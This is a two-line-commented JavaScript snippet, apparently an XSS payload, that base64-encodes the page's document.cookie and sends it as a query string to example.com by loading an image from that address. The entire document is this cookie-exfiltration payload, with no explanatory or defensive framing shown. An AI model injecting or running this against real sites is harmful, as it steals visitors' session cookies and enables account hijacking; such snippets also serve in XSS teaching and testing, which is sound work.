// This script will base64 encode the cookies and pass them
// as a query string parameter
var img = new Image();
img.src = 'http://example.com/?t=' + window.btoa(document.cookie);
